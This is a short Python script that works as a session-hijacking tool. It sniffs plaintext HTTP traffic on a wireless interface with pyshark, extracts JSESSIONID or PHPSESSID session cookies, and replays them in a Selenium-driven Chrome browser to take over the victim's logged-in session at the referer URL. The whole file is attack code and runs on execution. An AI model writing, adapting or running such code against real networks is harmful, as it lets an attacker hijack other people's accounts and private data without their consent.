from typing import List
import pyshark
from selenium import webdriver


def hijack():

    capture = pyshark.LiveCapture(
        interface="wlp0s20f3", display_filter="http.cookie"
    )

    for packet in capture.sniff_continuously():
        url = packet.http.referer
        session_cookie = get_cookie(packet.http.cookie)
        browser = webdriver.Chrome()
        browser.get(url)
        browser.add_cookie(session_cookie)
        browser.refresh()

        while(True):
            pass
        break

def parse_cookies(cookies: str) -> List[dict]:

    return [
        {"name": cookie[0], "value": cookie[1]}
        for cookie in [cookie.split("=") for cookie in cookies.split("; ")]
    ]


def get_cookie(cookies: str) -> dict:

    return next(
        cookie
        for cookie in parse_cookies(cookies)
        if cookie["name"] == "JSESSIONID" or cookie["name"] == "PHPSESSID"
    )

hijack()